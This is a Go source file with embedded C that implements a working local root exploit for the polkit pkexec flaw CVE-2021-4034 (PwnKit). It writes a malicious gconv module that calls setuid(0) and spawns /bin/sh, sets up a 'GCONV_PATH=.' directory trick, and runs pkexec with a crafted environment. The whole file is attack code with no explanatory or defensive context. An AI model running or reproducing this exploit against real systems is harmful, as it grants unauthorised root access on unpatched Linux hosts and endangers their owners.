package main

/*
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void st(){
	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
*/
import "C"

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
)

var shell string = "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nvoid gconv() {}\nvoid gconv_init() {\n\tsetuid(0); setgid(0);\n\tseteuid(0); setegid(0);\n\tsystem(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n\texit(0);\n}"

func CVE_2021_4034() {

	backup1 := exec.Command("/bin/sh", "-c", "mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'")
	if err := backup1.Run(); err != nil {
		log.Fatal(err)
	}

	backup1 = exec.Command("/bin/sh", "-c", "mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules")
	if err := backup1.Run(); err != nil {
		log.Fatal(err)
	}

	fp, err := os.Create("pwnkit/pwnkit.c")
	if err != nil {
		log.Fatal(err)
	}
	//defer fp.close()
	size, err := io.WriteString(fp, shell)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("[*]input %d byte\n", size)
	C.st()
}
